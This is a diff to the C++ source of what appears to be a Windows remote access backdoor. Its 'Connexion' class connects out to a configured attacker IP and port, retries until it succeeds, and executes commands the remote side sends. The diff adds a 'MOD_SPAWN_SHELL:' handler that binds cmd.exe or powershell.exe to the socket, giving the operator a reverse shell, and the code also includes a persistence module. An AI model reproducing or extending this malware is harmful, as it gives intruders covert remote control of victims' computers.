@@ -2,6 +2,7 @@
 #include "../inc/common.h"
 #include "../inc/Persistence.h"
 #include "../inc/other.h"
+#include "../inc/Exec.h"
 
 #include <iostream>
 #include <winsock2.h>
@@ -13,7 +14,7 @@ Connexion::Connexion()
 {
     ;
 } //Constructor
-int Connexion::openConnexion()
+int Connexion::openConnexion() //https://stackoverflow.com/questions/4993119/redirect-io-of-process-to-windows-socket
 {     
     if(sock_client!=0)
     {
@@ -28,20 +29,20 @@ int Connexion::openConnexion()
 
 //     SOCKADDR_IN address_client_tmp;
     sock_client = sock; //Find one alternativ
-    cout << sock << endl;
+    cout <<"SOCKET: " <<sock << endl;
     //cout <<"after socket sock: " <<sock_client <<endl;
 
     WSAStartup(MAKEWORD(2,0), &WSAData);
     
-    sock_client = socket(AF_INET,SOCK_STREAM,0);
+    sock_client =  WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
     address_client.sin_addr.s_addr= inet_addr(IP_ADDRESS);
     address_client.sin_family = AF_INET;
     address_client.sin_port = htons(PORT);
-    
+
     cout << "TIMEOUT__>" << TIMEOUT << endl;
     while(connect(sock_client,(SOCKADDR *)&address_client, sizeof(address_client)))
     {   
-        Sleep(TIMEOUT);
+        Sleep(1000);
         cout << "Whait...." <<endl;  
     } 
     return 0;
@@ -128,13 +129,13 @@ int Connexion::main(bool is_admin, string path_prog)
         }
         else
         {
-            if(command.length() > 20)
+            if(command.length() > 12)
             {
                 string juan = "juan";
-                cout << "len > 20" << endl;
-                cout << "TESST JUAN" << command.substr(0,4)<< endl;
-                cout << command.substr(0,22) << endl;
-                cout <<"STLEN OF  command.substr(23,command.length())" << command.substr(23,command.length()) << endl;
+                cout << "len > 12" << endl;
+                cout << "TESST JUAN" << command.substr(0,15)<< endl;
+                cout << command.length() << endl;
+             
             }
             //cout << "command in main ---->" << command.substr(0,command.length()-1) <<"<------------"<<endl;
             if(command=="exit")//change 
@@ -161,6 +162,28 @@ int Connexion::main(bool is_admin, string path_prog)
                 //send(sock_client,result.c_str(),strlen(result.c_str()),0);
                 sendSafe(result);
             }
+            else if(command.substr(0,16) == "MOD_SPAWN_SHELL:")
+            {   
+                cout << "\n\n\nIN MOD SHELL " << endl;
+                wchar_t  prog[20];
+                
+                //test if cmd.exe or powershell.exe
+                if(command.substr(16, command.length()) == "cmd.exe")
+                {
+                    wcscpy(prog, L"cmd.exe");
+                    Exec().spawnSHELL(sock_client,prog);
+                }
+
+                else
+                {      
+                    wcscpy(prog, L"powershell.exe");
+                    Exec().spawnSHELL(sock_client,prog);
+                }
+
+                cout << "FINISH ?" << endl;
+                //free(prog);
+                cout << "????" << endl;
+            }
             else if(command.substr(0,8)=="MOD_ALL:")
             {
                 exec(command.substr(8,command.length()));
@@ -184,7 +207,7 @@ int Connexion::main(bool is_admin, string path_prog)
             }
             else
             {
-                result = exec(command);
+                result = Exec().executeCommand(command);
                 cout << result << endl;
                 cout << result.length() <<endl;
                 result += getPath();
